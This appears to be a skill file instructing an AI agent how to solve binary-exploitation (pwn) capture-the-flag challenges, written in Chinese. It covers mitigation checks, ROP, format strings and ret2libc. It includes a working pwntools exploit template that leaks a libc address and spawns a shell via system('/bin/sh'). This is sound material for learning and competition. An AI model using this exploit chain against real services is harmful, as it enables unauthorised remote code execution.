---
name: pwn-stack
description: Stack overflow and binary exploitation (pwn) 栈溢出与二进制利用:checksec 缓解基线、cyclic 定位偏移、ret2libc/ROP、格式化字符串、pwntools exploit 脚本与 gdb 调试。Use this skill when the challenge provides a binary or service to exploit via memory corruption — overflow 溢出/栈溢出/堆溢出/format string 格式化字符串/ROP/ret2libc/pwn.
---

# 栈溢出与二进制利用(Pwn)

## 开局固定动作(前 10 分钟)

1. `file pwn` + `checksec --file=pwn`:记下 NX/PIE/Canary/RELRO,缓解组合直接决定路线。
2. 本地跑 `./pwn`,喂垃圾输入(`python3 -c "print('A'*200)"`)看崩溃点;有源码先读源码。
3. 远程形态确认:`nc <ip> <port>`,记录交互协议(提示语、输入次数、有无 echo)。
4. 异架构(非 x86/x64):`qemu-<arch> ./pwn` 直接跑,容器里 i386/arm/mips 等模拟器都有。

## 利用路线(按缓解组合)

- 无 Canary + 无 NX:ret2shellcode(输入落可执行段)。
- NX on:ret2libc——`ldd`/`readelf -d` 找 libc;目标 libc 不一致时先泄露
  (puts/write 打 GOT)再离线算偏移,不要用本地 libc 硬套。
- PIE on:先泄露 ELF 基址(格式化字符串 `%p`、输出函数),再复用。
- Canary:逐字节爆破(崩溃与否当 oracle)或格式化字符串泄露。
- 格式化字符串:`%p` 探参 → `%n` 写;FULL RELRO 下改写 GOT 行不通,转向
  hook/返回地址/fini_array。
- ROP:`ROPgadget --binary pwn` 找 gadget;`pop rdi; ret` + puts@plt 的
  泄露-返回-main 循环是万能第一段。

## pwntools 模板(写成可重放脚本存 work/)

```python
from pwn import *
context.arch = "amd64"            # 按实际架构
elf = ELF("./pwn"); libc = ELF("./libc.so.6")
p = remote("<ip>", <port>)        # 本地调试换 process("./pwn")
# 第一段:泄露
p.sendlineafter(b": ", flat(b"A"*72, elf.sym("pop_rdi"), elf.got.puts, elf.plt.puts, elf.sym("main")))
leak = u64(p.recvline().strip().ljust(8, b"\0"))
libc.address = leak - libc.sym.puts
# 第二段:system("/bin/sh")
p.sendlineafter(b": ", flat(b"A"*72, elf.sym("pop_rdi"), next(libc.search(b"/bin/sh\x00")), libc.sym.system))
p.interactive()
```

## 调试与验证

- `gdb ./pwn`;偏移用 `cyclic 200` 喂入、`cyclic -l <寄存器值>` 反查,不要手数。
- 远程打不通先回泄露段验证环境(libc 版本差异是第一嫌疑人),再查网络形态。
- 每拿到一个原语(泄露/写/执行)立刻 checkpoint(signalKind=exploit_primitive,
  evidenceRef=关键偏移与泄露输出);拿到 flag 先 checkpoint 留证、立即 submit(带同一个
  evidenceRef)。

## RiftX 工作流

- exploit.py 存 work/,偏移/地址作为脚本参数集中放置,不散落在对话里;attempt
  重入先重放泄露段确认远程环境未重置(重置 = 泄露值全变)。
- 所有地址计算在脚本里做(ASLR),上下文里只留结论。
- 堆题(UAF/tcache/fastbin)同样节奏:先本地复现,再固化脚本,远程只换 IO。

## 验收清单(Testing Checklist)

- [ ] checksec 结论已记录,利用路线与缓解组合一致。
- [ ] exploit.py 从零跑通两遍(重放可靠),flag 出现在 interactive 输出里。
- [ ] 拿到的原语/偏移已 checkpoint,flag 已 submit。
- [ ] 远程失败时已区分:环境重置 / libc 差异 / 网络问题,而不是盲目重试。

## 反模式

- 不做 checksec 直接套模板——PIE/Canary 白跑一轮。
- payload 只在交互里手工拼、不落盘——硬停后全部丢失。
- 本地通了就默认远程通——libc/环境差异必须用泄露值核对。
